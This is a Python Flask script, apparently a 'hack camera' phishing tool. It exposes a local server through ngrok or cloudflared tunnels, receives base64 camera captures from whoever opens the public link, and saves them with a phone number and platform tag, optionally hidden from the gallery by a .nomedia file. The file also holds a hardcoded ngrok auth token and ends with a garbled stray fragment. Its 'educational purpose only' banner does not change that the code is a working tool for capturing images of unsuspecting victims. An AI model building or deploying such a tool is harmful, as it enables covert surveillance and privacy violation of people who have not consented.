#!/usr/bin/env python3
# ⚡ SKY CDM — CDM TECH 503 — DARK HACKER EDITION ⚡
# 🔥 "Le code est une arme. Manipule-la avec honneur."
# 📸 STOCKAGE DIRECT DANS LA GALERIE ANDROID

from flask import Flask, render_template, request, jsonify
import os
import base64
import subprocess
import time
import re
import platform
import urllib.request
import json
import threading
import random
import sys
from datetime import datetime
from PIL import Image
import io

app = Flask(__name__)

# ==================== CONFIGURATION ====================
# Détection automatique du bon dossier de stockage
def get_storage_path():
    """Détecte le meilleur emplacement de stockage pour Android"""
    possible_paths = [
        "/storage/emulated/0/Pictures/SKY_CDM",      # Galerie Android classique
        "/sdcard/Pictures/SKY_CDM",                   # Carte SD
        "/storage/emulated/0/DCIM/SKY_CDM",           # Dossier DCIM (appareil photo)
        "/sdcard/DCIM/SKY_CDM",                       # DCIM sur carte SD
        "/storage/emulated/0/Download/SKY_CDM",       # Téléchargements
        os.path.expanduser("~/Pictures/SKY_CDM"),      # Linux/PC
        os.path.join(os.getcwd(), "captures")          # Dossier local par défaut
    ]
    
    for path in possible_paths:
        try:
            os.makedirs(path, exist_ok=True)
            # Test d'écriture
            test_file = os.path.join(path, ".test_write")
            with open(test_file, 'w') as f:
                f.write("test")
            os.remove(test_file)
            return path
        except:
            continue
    
    # Fallback local
    local_path = os.path.join(os.getcwd(), "captures")
    os.makedirs(local_path, exist_ok=True)
    return local_path

CAPTURE_DIR = get_storage_path()
PORT = 5000
NGROK_TOKEN = "cr_3BoLoibTTAfWwwvjKHBEQwYt8uG"

# ==================== NOTIFICATION GALERIE ANDROID ====================
def notify_media_scanner(filepath):
    """Force Android à scanner le fichier pour l'afficher dans la galerie"""
    try:
        # Méthode 1: broadcast MediaScanner (Android)
        if platform.system() == "Linux" and "android" in platform.platform().lower():
            subprocess.run(['am', 'broadcast', '-a', 'android.intent.action.MEDIA_SCANNER_SCAN_FILE', '-d', f'file://{filepath}'], 
                         capture_output=True, text=True)
        # Méthode 2: touch du dossier parent
        parent_dir = os.path.dirname(filepath)
        os.utime(parent_dir, None)
    except:
        pass

def create_nomedia():
    """Crée un fichier .nomedia si l'utilisateur veut cacher les photos"""
    nomedia_path = os.path.join(CAPTURE_DIR, ".nomedia")
    if not os.path.exists(nomedia_path):
        with open(nomedia_path, 'w') as f:
            f.write("# SKY CDM - Cache file")
    return nomedia_path

# ==================== ASCII CONVERSION ====================
def image_to_ascii(image_data, width=60):
    """Convertit une image en ASCII art"""
    try:
        img_bytes = base64.b64decode(image_data)
        img = Image.open(io.BytesIO(img_bytes))
        
        aspect_ratio = img.height / img.width
        new_height = int(width * aspect_ratio * 0.5)
        img = img.resize((width, new_height))
        img = img.convert('L')
        
        chars = " .:-=+*#%@"
        
        ascii_art = ""
        for y in range(img.height):
            for x in range(img.width):
                gray = img.getpixel((x, y))
                char_index = gray * len(chars) // 256
                ascii_art += chars[min(char_index, len(chars)-1)]
            ascii_art += "\n"
        
        return ascii_art
    except Exception as e:
        return f"[ERROR: {e}]"

def display_captures():
    """Affiche toutes les captures stockées avec leurs métadonnées"""
    if not os.path.exists(CAPTURE_DIR):
        print(f"\033[1;31m[✘] Dossier {CAPTURE_DIR} inexistant\033[0m")
        return
    
    files = [f for f in os.listdir(CAPTURE_DIR) if f.endswith('.jpg') or f.endswith('.jpeg') or f.endswith('.png')]
    if not files:
        print(f"\033[1;33m[!] Aucune capture trouvée\033[0m")
        return
    
    print(f"\n\033[1;36m╔══════════════════════════════════════════════════════════════╗\033[0m")
    print(f"\033[1;36m║  📸 GALERIE CDM — {len(files)} CAPTURE(S) DANS LA GALERIE         ║\033[0m")
    print(f"\033[1;36m║  📁 CHEMIN: {CAPTURE_DIR}\033[0m")
    print(f"\033[1;36m╚══════════════════════════════════════════════════════════════╝\033[0m\n")
    
    for i, filename in enumerate(files, 1):
        filepath = os.path.join(CAPTURE_DIR, filename)
        file_size = os.path.getsize(filepath) / 1024
        file_time = datetime.fromtimestamp(os.path.getmtime(filepath)).strftime("%Y-%m-%d %H:%M:%S")
        
        print(f"\033[1;33m[{i}] ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
        print(f"\033[1;32m📁 Fichier : {filename}\033[0m")
        print(f"\033[1;34m💾 Taille   : {file_size:.2f} KB\033[0m")
        print(f"\033[1;35m🕒 Date     : {file_time}\033[0m")
        print(f"\033[1;36m📊 Chemin    : {filepath}\033[0m")
        
        # Aperçu ASCII
        try:
            with open(filepath, 'rb') as f:
                img_data = base64.b64encode(f.read()).decode('utf-8')
            ascii_preview = image_to_ascii(img_data, width=50)
            print(f"\033[1;32m[PREVIEW ASCII]\033[0m")
            print(f"\033[1;37m{ascii_preview}\033[0m")
        except:
            print(f"\033[1;31m[PREVIEW INDISPONIBLE]\033[0m")
        
        print("")

def get_gallery_info():
    """Retourne des infos sur l'emplacement de la galerie"""
    info = {
        "path": CAPTURE_DIR,
        "is_android_gallery": "Pictures" in CAPTURE_DIR or "DCIM" in CAPTURE_DIR,
        "total_captures": len([f for f in os.listdir(CAPTURE_DIR) if f.endswith(('.jpg','.jpeg','.png'))]) if os.path.exists(CAPTURE_DIR) else 0,
        "free_space": "N/A"
    }
    
    try:
        statvfs = os.statvfs(CAPTURE_DIR)
        free_bytes = statvfs.f_frsize * statvfs.f_bavail
        info["free_space"] = f"{free_bytes // (1024**2)} MB"
    except:
        pass
    
    return info

# ==================== ASCII GLITCH BANNER ====================
def glitch_effect(text, delay=0.02):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

def show_skull():
    skull = r"""
                     ⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀              
                 ⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀           
               ⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀         
              ⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄        
             ⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆       
             ⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆      
            ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿      
            ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇     
            ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇     
             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃     
             ⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏      
              ⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁      
               ⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟       
               ⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁       
                 ⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋         
                   ⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠉           
                      ⠈⠙⠛⠛⠛⠛⠋⠉               
    """
    print(f"\033[1;31m{skull}\033[0m")

def sky_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print("\033[1;32m[ INITIALIZATION ]\033[0m", end="")
    for _ in range(3):
        time.sleep(0.3)
        print(".", end="", flush=True)
    time.sleep(0.5)
    
    show_skull()
    
    gallery_info = get_gallery_info()
    
    banner = f"""
\033[1;31m
╔══════════════════════════════════════════════════════════════════════════════╗
║  ░██████╗██╗░░██╗██╗░░░██╗░░░░░██████╗░██████╗███╗░░░███╗░░░░░░░░░░░░░░░░  ║
║  ██╔════╝██║░██╔╝╚██╗░██╔╝░░░░░██╔════╝██╔══██╗████╗░████║░░░░░░░░░░░░░░  ║
║  ╚█████╗░█████╔╝░░╚████╔╝░░░░░░██║░░░░░██║░░██║██╔████╔██║░░░░░░░░░░░░░░  ║
║  ░╚═══██╗██╔═██╗░░░╚██╔╝░░░░░░░██║░░░░░██║░░██║██║╚██╔╝██║░░░░░░░░░░░░░░  ║
║  ██████╔╝██║░╚██╗░░░██║░░░░░░░░╚██████╗██████╔╝██║░╚═╝░██║░░░░░░░░░░░░░░  ║
║  ╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░░░░░░░╚═════╝╚═════╝░╚═╝░░░░░╚═╝░░░░░░░░░░░░░░  ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  \033[1;35m▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\033[1;31m  ║
║  \033[1;36m⚡ SKY CDM — CDM TECH 503 — DARK HACKER EDITION ⚡\033[1;31m                  ║
║  \033[1;35m▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\033[1;31m  ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  \033[1;33m👑 DEV....: SKY PLUG CDM — The Living Legend\033[1;31m                       ║
║  \033[1;32m💀 TEAM...: CDM TECH 503 — Digital Mafia\033[1;31m                          ║
║  \033[1;34m📡 STATUT.: FULLY OPERATIONAL\033[1;31m                                      ║
║  \033[1;37m🗂️  STORAGE: {CAPTURE_DIR}\033[1;31m                                           ║
║  \033[1;35m📸 CAPTURES: {gallery_info['total_captures']} fichiers dans la galerie\033[1;31m                       ║
║  \033[1;33m💾 FREE SPACE: {gallery_info['free_space']}\033[1;31m                                                  ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  \033[1;31m⚠️  WARNING: Unauthorized access is forbidden by law ⚠️\033[1;31m             ║
║  \033[1;33m[*] Educational purpose only — The author is not responsible\033[1;31m       ║
╚══════════════════════════════════════════════════════════════════════════════╝
\033[0m
"""
    for line in banner.split('\n'):
        print(line)
        time.sleep(0.02)

# ==================== ROUTES FLASK ====================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.get_json()
        if not data or 'image' not in data or 'number' not in data:
            return jsonify({'status': 'error', 'message': 'Invalid data'}), 400

        image_data = data['image'].split(',')[1]
        number = data['number']
        platform = data.get('platform', 'unknown')
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        os.makedirs(CAPTURE_DIR, exist_ok=True)
        
        # Format du fichier avec plateforme
        filename = f"SKYCDM_{platform}_{number}_{timestamp}.jpg"
        filepath = os.path.join(CAPTURE_DIR, filename)
        
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(image_data))
        
        # Notifier le scanner média Android
        notify_media_scanner(filepath)
        
        # Afficher dans le terminal
        print(f"\n\033[1;32m[✔] CAPTURE STORED → {filename}\033[0m")
        print(f"\033[1;34m[📁] CHEMIN: {filepath}\033[0m")
        print(f"\033[1;32m[🖼️] VISIBLE DANS LA GALERIE ANDROID\033[0m")
        
        print(f"\033[1;34m[📸] APERÇU ASCII :\033[0m")
        ascii_preview = image_to_ascii(image_data, width=60)
        print(f"\033[1;37m{ascii_preview}\033[0m")
        
        return jsonify({'status': 'success', 'file': filename, 'path': filepath})
    
    except Exception as e:
        print(f"\033[1;31m[✘] UPLOAD FAILED → {e}\033[0m")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/gallery', methods=['GET'])
def gallery():
    """Route API pour voir toutes les captures"""
    if not os.path.exists(CAPTURE_DIR):
        return jsonify({'status': 'error', 'message': 'No captures yet'}), 404
    
    files = [f for f in os.listdir(CAPTURE_DIR) if f.endswith(('.jpg','.jpeg','.png'))]
    captures = []
    for f in files:
        filepath = os.path.join(CAPTURE_DIR, f)
        captures.append({
            'filename': f,
            'size': os.path.getsize(filepath),
            'size_kb': round(os.path.getsize(filepath) / 1024, 2),
            'date': datetime.fromtimestamp(os.path.getmtime(filepath)).isoformat(),
            'path': filepath
        })
    
    return jsonify({
        'status': 'success', 
        'count': len(captures), 
        'storage_path': CAPTURE_DIR,
        'captures': captures
    })

# ==================== NGROK ====================
def download_ngrok():
    arch = platform.machine()
    if arch.startswith(('arm', 'aarch')):
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
    elif arch == 'x86_64':
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
    else:
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
    
    if os.path.exists('ngrok'):
        os.remove('ngrok')
    
    print("\033[1;34m[↻] DOWNLOADING NGROK...\033[0m")
    os.system(f'curl -sL {url} -o ngrok.zip')
    os.system('unzip -qq -o ngrok.zip')
    os.system('chmod +x ngrok')
    os.remove('ngrok.zip')

def start_ngrok():
    download_ngrok()
    print("\033[1;34m[↻] AUTHENTICATING...\033[0m")
    os.system(f'./ngrok authtoken {NGROK_TOKEN} 2>/dev/null')
    
    print("\033[1;34m[↻] DEPLOYING TUNNEL...\033[0m")
    process = subprocess.Popen(
        ['./ngrok', 'http', str(PORT), '--log=stdout'],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )
    
    for _ in range(30):
        try:
            with urllib.request.urlopen('http://127.0.0.1:4040/api/tunnels') as resp:
                tunnels = json.load(resp).get('tunnels', [])
                for t in tunnels:
                    url = t.get('public_url', '')
                    if url.startswith('https://'):
                        print(f"\n\033[1;32m╔══════════════════════════════════════════════╗\033[0m")
                        print(f"\033[1;32m║  🔗 PUBLIC LINK (NGROK) :\033[0m")
                        print(f"\033[1;32m║  \033[1;35m{url}\033[0m")
                        print(f"\033[1;32m╚══════════════════════════════════════════════╝\033[0m\n")
                        return process
        except:
            time.sleep(0.5)
    
    print("\033[1;31m[✘] NGROK FAILED → LOCAL MODE ONLY\033[0m")
    return process

# ==================== CLOUDFLARED ====================
def start_cloudflared():
    try:
        process = subprocess.Popen(
            ['cloudflared', 'tunnel', '--url', f'http://localhost:{PORT}'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        url_pattern = r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com'
        
        for _ in range(40):
            line = process.stdout.readline()
            if not line:
                break
            match = re.search(url_pattern, line)
            if match:
                url = match.group(0)
                print(f"\n\033[1;32m╔══════════════════════════════════════════════╗\033[0m")
                print(f"\033[1;32m║  🔗 PUBLIC LINK (CLOUDFLARED) :\033[0m")
                print(f"\033[1;32m║  \033[1;36m{url}\033[0m")
                print(f"\033[1;32m╚══════════════════════════════════════════════╝\033[0m\n")
                return process
            time.sleep(0.5)
        
        print("\033[1;31m[✘] CLOUDFLARED NOT DETECTED\033[0m")
    except Exception as e:
        print(f"\033[1;31m[✘] CLOUDFLARED ERROR → {e}\033[0m")
    return None

# ==================== FLASK LAUNCHER ====================
def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)

# ==================== MENU PRINCIPAL ====================
def main_menu():
    print("\n\033[1;33m┌──(\033[1;32mroot@SKYCDM\033[1;33m)-[\033[1;36m~\033[1;33m]\033[0m")
    print("\033[1;33m└──╼ \033[1;36mMAIN MENU:\033[0m")
    print("\033[1;32m   [1] START HACK CAMERA (Tunnel + Flask)\033[0m")
    print("\033[1;32m   [2] VIEW CAPTURES GALLERY\033[0m")
    print("\033[1;32m   [3] DELETE ALL CAPTURES\033[0m")
    print("\033[1;32m   [4] SHOW STORAGE INFO\033[0m")
    print("\033[1;31m   [5] EXIT\033[0m")
    
    choice = input("\n\033[1;33m➤ \033[1;36m").strip()
    return choice

def show_storage_info():
    """Affiche les infos de stockage"""
    info = get_gallery_info()
    print(f"\n\033[1;36m╔══════════════════════════════════════════════╗\033[0m")
    print(f"\033[1;36m║  💾 STORAGE INFORMATION                      ║\033[0m")
    print(f"\033[1;36m╚══════════════════════════════════════════════╝\033[0m")
    print(f"\033[1;33m📁 Chemin: {info['path']}\033[0m")
    print(f"\033[1;33m📸 Captures: {info['total_captures']}\033[0m")
    print(f"\033[1;33m💾 Espace libre: {info['free_space']}\033[0m")
    print(f"\033[1;33m🖼️  Dans galerie Android: {'✅ OUI' if info['is_android_gallery'] else '❌ NON'}\033[0m")
    
    if os.path.exists(CAPTURE_DIR):
        files = os.listdir(CAPTURE_DIR)
        jpg_files = [f for f in files if f.endswith(('.jpg','.jpeg','.png'))]
        print(f"\n\033[1;36m📋 DERNIÈRES CAPTURES:\033[0m")
        for f in jpg_files[-5:]:
            print(f"   └─ 📸 {f}")

# ==================== MAIN ====================
if __name__ == '__main__':
    sky_banner()
    
    while True:
        choice = main_menu()
        
        if choice == "1":
            print("\n\033[1;33m┌──(\033[1;32mroot@SKYCDM\033[1;33m)-[\033[1;36m~\033[1;33m]\033[0m")
            print("\033[1;33m└──╼ \033[1;36mSELECT TUNNEL:\033[0m")
            print("\033[1;32m   [1] CLOUDFLARED \033[0m(\033[1;34mrecommended\033[0m\033[1;32m)\033[0m")
            print("\033[1;32m   [2] NGROK\033[0m")
            tunnel_choice = input("\n\033[1;33m➤ \033[1;36m").strip()
            
            tunnel_process = None
            if tunnel_choice == "2":
                tunnel_process = start_ngrok()
            else:
                tunnel_process = start_cloudflared()
            
            print("\n\033[1;34m[↻] STARTING FLASK SERVER...\033[0m")
            print(f"\033[1;33m[📁] Les captures seront sauvegardées dans: {CAPTURE_DIR}\033[0m")
            print("\033[1;33m[!] PRESS CTRL+C TO TERMINATE\033[0m\n")
            
            try:
                run_flask()
            except KeyboardInterrupt:
                print("\n\033[1;31m[✘] KILLING PROCESSES...\033[0m")
                if tunnel_process:
                    tunnel_process.terminate()
                print("\033[1;32m[✔] SYSTEM SHUTDOWN — SKY CDM OUT\033[0m")
            break
            
        elif choice == "2":
            display_captures()
            input("\n\033[1;33m[!] Press ENTER to continue...\033[0m")
            sky_banner()
            
        elif choice == "3":
            if os.path.exists(CAPTURE_DIR):
                import shutil
                count = len([f for f in os.listdir(CAPTURE_DIR) if f.endswith(('.jpg','.jpeg','.png'))])
                confirm = input(f"\033[1;31m[!] Supprimer {count} capture(s) ? (y/N): \033[0m")
                if confirm.lower() == 'y':
                    shutil.rmtree(CAPTURE_DIR)
                    os.makedirs(CAPTURE_DIR, exist_ok=True)
                    print(f"\033[1;32m[✔] {count} CAPTURE(S) DELETED\033[0m")
                else:
                    print("\033[1;33m[!] Annulé\033[0m")
            else:
                print(f"\033[1;33m[!] No captures to delete\033[0m")
            time.sleep(2)
            sky_banner()
            
        elif choice == "4":
            show_storage_info()
            input("\n\033[1;33m[!] Press ENTER to continue...\033[0m")
            sky_banner()
            
        elif choice == "5":
            print("\033[1;31m[✘] EXIT — SKY CDM OUT\033[0m")
            break
        else:
            print("\033[1;31m[✘] INVALID CHOICE\033[0m")
            time.sleep(1)
            sky_banner()OUT\033[0m")
